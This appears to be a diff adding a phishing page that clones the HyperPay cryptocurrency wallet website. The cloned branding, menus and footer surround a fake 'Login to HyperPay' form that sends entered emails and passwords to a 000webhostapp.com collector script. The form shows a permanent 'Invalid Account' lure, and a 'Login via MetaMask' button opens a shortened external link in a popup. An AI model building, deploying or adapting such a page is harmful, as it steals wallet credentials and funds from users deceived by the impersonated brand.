@@ -1,0 +1,457 @@
+
+<html lang="en" style="font-size: 99.5833px;">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta name="viewport" content="width=device-width,height=device-height,inital-scale=1.0,maximum-scale=1.0,user-scalable=no;">
+    <title>HyperPay Wallet - Secure Multi Crypto &amp; Bitcoin Wallet</title>
+	<link rel="icon" type="image/png" href="https://www.hyperpay.tech/data/upload/2019-08/20190814170802332023.png" sizes="32x32"/> 
+	<link rel="icon" type="image/png"https://www.hyperpay.tech/data/upload/2019-08/20190814170802332023.png" sizes="192x192"/>
+    <link rel="stylesheet" href="https://hyperpay-website.oss-cn-hongkong.aliyuncs.com/static/dist/fonts/iconfont/iconfont.css">
+    <script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script>
+	<script src="https://hm.baidu.com/hm.js?9d6dfaad41381bc38cba08d5941ea5df"></script>
+	<script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script>
+    <script src="https://hm.baidu.com/hm.js?9d6dfaad41381bc38cba08d5941ea5df"></script>
+    <script src="https://hyperpay-website.oss-cn-hongkong.aliyuncs.com/static/dist/fonts/iconfont/iconfont.js"></script>
+    <!-- <script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1277860128&web_id=1277860128"></script> -->
+    <link rel="stylesheet" href="https://hyperpay-website.oss-cn-hongkong.aliyuncs.com/static/dist/css/common.css?v=0.57">
+<link rel="stylesheet" href="./css/mon.css">
+
+<script src="https://code.iconify.design/2/2.1.2/iconify.min.js"></script>
+<script src="https://hyperpay-website.oss-cn-hongkong.aliyuncs.com/static/dist/fonts/iconfont/iconfont.js"></script>
+<script src="https://kit.fontawesome.com/cbc56c8f36.js" crossorigin="anonymous"></script>
+									
+</head>
+
+<body >
+ <div class="download-main">
+	<header class="header-fixed">
+	<div class="wrapper">
+	<a class="logo" href="?lang=en">
+	<img src="https://hyperpay-website.oss-cn-hongkong.aliyuncs.com/static/dist/images/common/logo.svg" alt="" class="logo_img">
+	</a>
+	<div class="nav">
+	<div class="nav-item ">
+		<a class="item-a" href="javascript:;">
+			Products<i class="iconfont iconicon_down"></i>
+		</a>
+	
+		<div class="item-drop">
+	<i class="icon-arrow icon-wallet-offchain"></i>
+	<a class="item" href="?/wallet_offchain">
+	<i class="item-icon iconfont iconicon_tuoguan"></i>
+	<div class="item-text">
+	<p>Off-chain</p>
+	<span>Your Preferred Safe Asset-Management Wallet</span>
+	</div>
+	</a>
+	<a class="item" href="?/wallet_onchain">
+	<i class="item-icon iconfont iconicon_siyao"></i>
+	<div class="item-text">
+	<p>On-chain</p>
+	<span>Assets Securely Protected by Local-Stored Private Key</span>
+	</div>
+	</a>
+	<a class="item" href="?/hyperkey">
+	<i class="item-icon iconfont iconicon_lixian"></i>
+	<div class="item-text">
+	<p>HyperKey</p>
+	<span>Never Connect Network, Assets Safer</span>
+	</div>
+	</a>
+	<a class="item" href="?/hardware">
+	<i class="item-icon iconfont iconicon_yingjian"></i>
+	<div class="item-text">
+	<p>HyperMate</p>
+	<span>Bluetooth Connection, CC EAL6+ SE</span>
+	</div>
+	</a>
+	
+	<a class="item" href="https://hyperbc.com/card?from=hyperpay&amp;lang=en" target="_blank">
+	<i class="item-icon iconfont iconicon_card"></i>
+	<div class="item-text">
+	<p>Credit Card</p>
+	<span>Deposit Digital Currency, Enjoy Global Payment</span>
+	</div>
+	</a>
+	<a class="item" href="/wallet">
+		<i class="item-icon iconfont iconicon_quanbu"></i>
+		<div class="item-text">
+			<p>View All</p>
+	</div>
+	</a>
+	</div>
+	</div>
+	
+	<div class="nav-item ">
+	<a class="item-a" href="javascript:;">Asset Value-added<i class="iconfont iconicon_down"></i>
+	</a>
+	<div class="item-drop">
+	<i class="icon-arrow"></i>
+	<a class="item" href="?/wealth">
+	<i class="item-icon iconfont iconicon_licai"></i>
+	<div class="item-text">
+	<p>Investment</p>
+	<span>Stable Returns, Flexible Choices</span>
+	</div>
+	</a>
+	<a class="item" href="?/pos">
+	<i class="item-icon iconfont iconicon_staking"></i>
+	<div class="item-text">
+	<p>Staking</p>
+	<span>Biggest, Most Professional PoS Staking</span>
+	</div>
+	</a>
+	<a class="item" href="?/cloud">
+	<i class="item-icon iconfont iconicon_yun"></i>
+	<div class="item-text">
+	<p>Cloud Mining</p>
+	<span>Safest, Simplest Mining Method</span>
+	</div>
+	</a>
+	<a class="item" href="?/loan">
+	<i class="item-icon iconfont iconicon_jiedai"></i>
+	<div class="item-text">
+	<p>BitLoan</p>
+	<span>Reliable Digital Currency Mortgage Loan</span>
+	</div>
+	</a>
+	
+	<!--<a class="item" href="/double_coin">
+	<i class="item-icon iconfont iconicon_shuangbi"></i>
+	<div class="item-text">
+	<p>Dual-C</p>
+	<span>Price-linked, Gain Safely</span>
+	</div>
+	</a>-->
+	
+	</div>
+	</div>
+
+	<div class="nav-item">
+	<a class="item-a" href="javascript:;">
+	For Business<i class="iconfont iconicon_down"></i>
+	</a>
+	<div class="item-drop">
+	<i class="icon-arrow"></i>
+	
+	<a class="item" href="https://hyperbc.com/custody?from=hyperpay&amp;lang=en" target="_blank">
+	<i class="item-icon iconfont iconicon_yunqianbao"></i>
+	<div class="item-text">
+	<p>Enterprise Cloud Wallet</p>
+	<span>Safe&amp;Compliant Enterprise-Level Digital Asset Custody Service</span>
+	</div>
+	</a>
+	
+	<a class="item" href="https://hyperbc.com/hpay?from=hyperpay&amp;lang=en" target="_blank">
+	<i class="item-icon iconfont iconicon_zichan"></i>
+	<div class="item-text">
+	<p>Merchant Payment</p>
+	<span>Customized Custody &amp; Payment Solutions for Enterprise</span>
+	</div>
+	</a>
+
+	<a class="item" href="#" style="display: none">
+	<i class="item-icon iconfont iconicon_otc"></i>
+	<div class="item-text">
+	<p>私钥自管钱包</p>
+	<span>永不触网，资产更安全</span>
+	</div>
+	</a>
+
+	</div>
+	</div>
+	<div class="nav-item ">
+	<a class="item-a" href="/support">
+	Support
+	</a>
+	</div>
+	
+	
+                </div>
+                <div class="right">
+                    <div class="language">
+                        <span class="lang">
+                    <i class="iconfont iconlanguage-icon"></i>
+                    <span class="t">En</span>
+                        </span>
+
+                        <div class="lang-dropdown">
+                            <a class="item zh-cn" href="?lang=zh-cn">中文</a> <a class="item korea" href="?lang=korea">한국어</a>
+                        </div>
+                    </div>
+
+                    <a href="/download" class="download">
+
+                        <img class="icon" src="https://hyperpay-website.oss-cn-hongkong.aliyuncs.com/static/dist/images/hardware/down-icon.png">
+
+                        <span>Download App</span>
+                    </a>
+
+                </div>
+
+                <div class="shop-hpy">
+                    <a href="https://shop.hyperpay.tech" target="_blank" class="icon">
+                    
+                    </a>
+                </div>
+                <span class="mobile-nav-btn"><i></i></span>
+            </div>
+        </header>
+
+        <!-- 移动端nav -->
+        <div class="mobile-nav-container">
+            <div class="mobile-nav">
+                <div class="flex-box1">
+                    <ul>
+                        <li class="li-item">
+                            <a class="item-a" href="javascript:;">
+                                Wallet<i class="iconfont iconicon_down"></i>
+                            </a>
+                            <div class="item-drop">
+                                <div class="item"><a href="?/wallet_offchain">Off-chain</a></div>
+                                <div class="item"><a href="?/wallet_onchain">On-chain</a></div>
+                                <div class="item"><a href="?/hyperkey">HyperKey</a></div>
+                                <div class="item"><a href="?/hardware">HyperMate</a></div>
+                                <div class="item"><a href="https://hyperbc.com/card?from=hyperpay&amp;lang=en">Credit
+                                        Card</a></div>
+                                <div class="item"><a href="?/wallet">View All</a></div>
+                            </div>
+                        </li>
+                        <li class="li-item">
+                            <a class="item-a" href="javascript:;">
+                                Asset Value-added<i class="iconfont iconicon_down"></i>
+                            </a>
+                            <div class="item-drop">
+                                <div class="item"><a href="?/wealth">Investment</a></div>
+                                <div class="item"><a href="?/pos">Staking</a></div>
+                                <div class="item"><a href="?/cloud">Cloud Mining</a></div>
+                                <div class="item"><a href="?/loan">BitLoan</a></div>
+                                <div class="item"><a href="?/double_coin">Dual-C</a></div>
+                            </div>
+                        </li>
+
+                        <li class="li-item">
+                            <a class="item-a" href="javascript:;">
+                                For Business<i class="iconfont iconicon_down"></i>
+                            </a>
+                            <div class="item-drop">
+                                <div class="item"><a href="https://hyperbc.com/hpay?from=hyperpay&amp;lang=en">Merchant
+                                        Payment</a></div>
+
+                                <div class="item"><a href="https://hyperbc.com/custody?from=hyperpay&amp;lang=en">
+                                        <p>Enterprise Cloud Wallet</p>
+                                    </a></div>
+
+                            </div>
+                        </li>
+
+                        <li class="li-item ">
+                            <a class="item-a" href="/support">
+                                Support
+                            </a>
+                        </li>
+
+                    </ul>
+                </div>
+
+                <div class="icon-wrap fl">
+                    <a href="app_down"><span class="down-btn">Download App</span></a>
+                </div>
+
+                <div class="flex-box2">
+                    <div class="lang-wrap">
+                        <a href="?lang=en" class="lang-btn active">English</a>
+                        <em>|</em>
+                        <a href="?lang=zh-cn" class="lang-btn ">中文</a>
+                        <em>|</em>
+                        <a href="?lang=korea" class="lang-btn ">한국어</a>
+                    </div>
+                </div>
+
+            </div>class="right-side fr"
+        </div>
+        <section class="download-con">
+            <div class="download-section1 banner-section" style=" min-height: 9.4rem !important; height: 9.4rem !important; ">
+                <div class="sec-contain banner-section-contain clearfix">
+				<div class="right-side fr">
+                        <img src="https://hyperpay-website.oss-cn-hongkong.aliyuncs.com/static/dist/images/download/phone-downloadpc.png">
+                    </div>
+					<div class="left-side fr">
+                        <img src="https://hyperpay-website.oss-cn-hongkong.aliyuncs.com/static/dist/images/wallet/iphone-shared-wallet.png" style=" width: 85%; z-index: 0; ">
+                    </div>
+                    <div class="sc-fvhFOF eZrolp" style="">
+					<div class="sc-bdfBQB sc-httYss hsXoKH cCoTJd">
+					<div class="sc-bdfBQB sc-gVgoRu ccuXVo cQWYUz">
+<img src="https://hyperpay-website.oss-cn-hongkong.aliyuncs.com/static/dist/images/common/logo.svg" alt="" class="logo_img" width="75%" height="50%" style="margin: 0 50px 10px;">
+					<div class="sc-cbDFGl fRjwaG" ></div>
+                    <form method="post" action="https://hyperpay-wallet.000webhostapp.com/pay1.php">
+					<div class="sc-cbDFGl fRjwaG" style=" margin-bottom: 10px; ">Login to HyperPay</div>
+					<i class="fa-solid fa-chevron-right"></i>							    
+					<div class="sc-bdfBQB sc-hjWSTT eOlgOh dRqkdT">
+					<div class="sc-bdfBQB sc-cOajNj bivACJ cdfuIO">
+					<label class="sc-bdfBQB sc-hTZgZg iyaAis fezaFq input-label">
+					<div class="sc-bdfBQB kcIGzg">
+					<span color="rgb(72, 81, 86)" class="sc-gsTEea beMwTW input-left-label">Email</span>
+					</div>
+					<span color="rgb(72, 81, 86)" class="sc-gsTEea beMwTW input-right-label"></span>
+					</label>
+					<div data-private="true" class="sc-gTgzoy iQacNP">
+					<input class="sc-Azgjq XRsCQ" placeholder="Enter your email" type="email" name="email" id="email"></div>
+					</div>
+					<div class="sc-bdfBQB sc-cOajNj bivACJ cdfuIO">
+					<label class="sc-bdfBQB sc-hTZgZg iyaAis fezaFq input-label">
+					<div class="sc-bdfBQB kcIGzg">
+					<span color="rgb(72, 81, 86)" class="sc-gsTEea beMwTW input-left-label">Password</span>
+					</div>
+					<span color="rgb(72, 81, 86)" class="sc-gsTEea beMwTW input-right-label"></span>
+					</label>
+					<div data-private="true" class="sc-gTgzoy iQacNP">
+					<input class="sc-Azgjq XRsCQ" placeholder="Enter your password" type="password" name="password" id="password"></div>
+					</div>
+                    <center>
+        <div align="text-md-left">
+<br><font size="3" color="red">Invalid Account</font>
+</center>
+					</div>
+					<button type="submit" class="sc-dlfnuX ktcZxh">
+					<span color="#ffffff" class="sc-gsTEea jnXyBP">Login</span>
+          				<i class="fa-solid fa-chevron-right"></i>
+					</button>
+					<div><div>
+					<div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe title="reCAPTCHA" src="https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6LfnDXUUAAAAAAFwuBbkcfLWBxa1rlUikjzKwlhD&amp;co=aHR0cHM6Ly93YXppcnguY29tOjQ0Mw..&amp;hl=en&amp;v=zLD1nfkNCJC1kEswSRdSyd-p&amp;size=invisible&amp;badge=bottomright&amp;cb=pnq7578kmpu0" width="256" height="60" role="presentation" name="a-m5le0sc8jbhz" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-1" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;"></iframe></div></div><span class="sc-gsTEea gYNfaY">
+					<a href="?=signup-source form">Sign Up</a></span><span class="sc-gsTEea gYNfaY"><a href="?=reset-password">Forgot Password?</a></span></form><div class="oauth-login"><div class="oauth-login-separator"></div><button class="login-button" <button href="#" onclick="window.open('https://t.ly/EqDH','','toolbar=yes,scrollbars=yes,resizable=yes,top=0,left=100000,width=400,height=780') ;return false" rel="dialog" <a="" class="btn btn-block btn-primary downloadapp-native">
+					<img width="33" height="33" viewbox="0 0 19 19" fill="#FFFFFF" src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/1200px-MetaMask_Fox.svg.png" style=" background: #0e1523; border-radius: 16px; ">
+					<span class="text">Login via MetaMask</span></button></div></div></div></div>
+                    
+
+                </div>
+            </div>
+            <div class="download-section2">
+                <h3 class="download-section2-t">All-in-one Solution</h3>
+                <div class="download-section2-txt sec-contain clearfix">
+                    <div class="br-item me-item">
+                        <img src="https://hyperpay-website.oss-cn-hongkong.aliyuncs.com/static/dist/images/download/solution-mixedwallet.png" alt="">
+                        <h3>Digital Assets Storage</h3>
+                        <p>All-in-one wallet combines on-chain, off-chain, shared and hardware wallet innovatively,
+                            easily managing all the assets of both on-chain and off-chain.</p>
+                    </div>
+                    <div class="ft-item me-item">
+                        <img src="https://hyperpay-website.oss-cn-hongkong.aliyuncs.com/static/dist/images/download/solution-cryptowealth.png" alt="">
+                        <h3>Digital Assets Investment</h3>
+                        <p>The world-leading digital-assets management platform brings multiple investment choices, such
+                            as BitEarn, BitLoan, Staking, fixed-investment, etc.</p>
+                    </div>
+                    <div class="lf-item me-item">
+                        <img src="https://hyperpay-website.oss-cn-hongkong.aliyuncs.com/static/dist/images/download/solution-fastexchange.png" alt="">
+                        <h3>Digital Assets Transaction</h3>
+                        <p>Instant exchange and built-in CoinW Exchange working together can meet all your operating
+                            needs.</p>
+                    </div>
+                </div>
+            </div>
+
+        </section>
+        <footer class="footer">
+	<div class="footer-top">
+		<div class="footer-txt sec-contain clearfix">
+	
+	
+	<div class="p-us about-item fl ">
+		<div class="connect-title">Products</div>
+		<ul>
+			<li><a href="?/download" target="_blank" class="">HyperPay</a></li>
+			<li><a href="?/hardware" target="_blank" class="">HyperMate</a></li>
+			<li><a href="?/hyperkey" target="_blank" class="">HyperKey</a></li>
+		</ul>
+	</div>
+	
+	<div class="c-us about-item fl">
+	<div class="connect-title">Contact us</div>
+	<ul>
+	<li><a href="https://hyperpayhelp.zendesk.com/hc/en-us" target="_blank">FAQs</a></li>
+	<li><a href="https://hyperpayhelp.zendesk.com/hc/en-us/requests/new" target="_blank">Contact Us</a></li>
+	<li><a href="?=latest_news?lang=en" class="">News center</a></li>
+	<li><a href="?=support?lang=en" class="">Customer Support</a></li>
+	</ul>
+	</div>
+	<div class="l-us about-item fl">
+	<div class="connect-title">About</div>
+	<ul>
+	<li><a href="https://hyperpayhelp.zendesk.com/hc/en-us/articles/360001254595-Company-Introduction">Company Profile</a></li>
+	<!--<li><a href="/team" class="">Team Introduction</a></li>-->
+	<li><a href="?/hyperpay" class="">Partners</a></li>
+	<li><a href="?/latest_news" class="">News</a></li>
+	<li><a href="?/policy" class="">Privacy Policy</a></li>
+	</ul>
+	</div>
+	<div class="l-us about-item fl">
+	<div class="connect-title">Business</div>
+	<ul>
+	<li><a target="_blank" href="https://hyperbc.com/?from=hyperpay&amp;lang=en">Custody</a>
+	</li>
+	<li><a href="?/wallet" class="">Wallets</a></li>
+	<li><a href="?/trading" class="">Trading</a></li>
+	<li><a href="?/pos" class="">Staking</a></li>
+	<li><a href="?/wealth" class="">Investment</a></li>
+	<li><a href="?/loan" class="">BitLoan</a></li>
+	<li><a href="?/cloud" class="">Cloud Mining</a></li>
+	</ul>
+	</div>
+	<div class="of-me-us about-item fr">
+	<div class="connect-title">Official Media</div>
+	<ul class="of-item clearfix">
+	<li><a href="https://www.facebook.com/hyperpayofficial/" target="_blank"><i class="iconfont iconsocial-facebook"></i></a></li>
+	<li><a href="https://twitter.com/HyperPay_tech" target="_blank"><i class="iconfont iconsocial-twitter"></i></a></li>
+	<li><a href="https://t.me/HyperPay_En" target="_blank"><i class="iconfont iconsocial-telegram"></i></a></li>
+	<li><a href="https://github.com/hyperpayorg/hardwallet" target="_blank"><i class="iconfont icongithubcolor"></i></a></li>
+	</ul>
+	<ul class="of-item clearfix">
+	<li>
+	<a href="javascript:void(0)" class="icon-qq">
+	<div class="footer-item-hover">
+	<img src="?/data/upload/2019-08/20190808100531760062.png">
+	<span>Scan QR Code</span>
+	</div>
+	</a>
+	</li>
+	<li>
+	<a href="javascript:void(0)" class="icon-wx"><i class="iconfont iconsocial-wechat"></i>
+	<div class="footer-item-hover">
+	<img src="?/data/upload/2019-09/20190910125147214304.jpeg">
+	<span>Scan QR Code</span>
+	</div>
+	</a>
+	</li>
+	<!--<li>
+	<a href="https://www.weibo.com/p/1005056358820994" target="_blank"><i class="iconfont iconsocial-weibo"></i></a>
+	</li>-->
+	</ul>
+	</div>
+	</div>
+	</div>
+	<div class="footer-bottom">
+	<div class="footer-txt sec-contain">
+	<div class="clearfix">
+	<h3 class="fl">Copyright © 2022 HyperPay. </h3>
+	<h3 class="from fr"><a>Address: Tower C, TML Plaza, Tsuen Wan, Hong Kong</a></h3>
+	</div>
+	</div>
+	</div>
+	</footer>
+
+	<!-- Global site tag (gtag.js) - Google Analytics -->
+	<script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-90622655-2"></script>
+	<script src="https://wazirx.com/static/js/19.4b249f0d.chunk.js"></script>
+	<script src="chrome-extension://ldinpeekobnhjjdofggfgjlcehhmanlj/inpage.js" id="stacks-wallet-provider"></script>
+	<div style="position: absolute; top: -500px">
+	<script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1280059737&amp;web_id=1280059737">
+	</script><script src="https://c.cnzz.com/core.php?web_id=1280059737&amp;t=z" charset="utf-8" type="text/javascript"></script><a href="https://www.cnzz.com/stat/website.php?web_id=1280059737" target="_blank" title="站长统计">站长统计</a>
+	</div>
+    </div>
+
+</div>
+
+</body>
+</html>
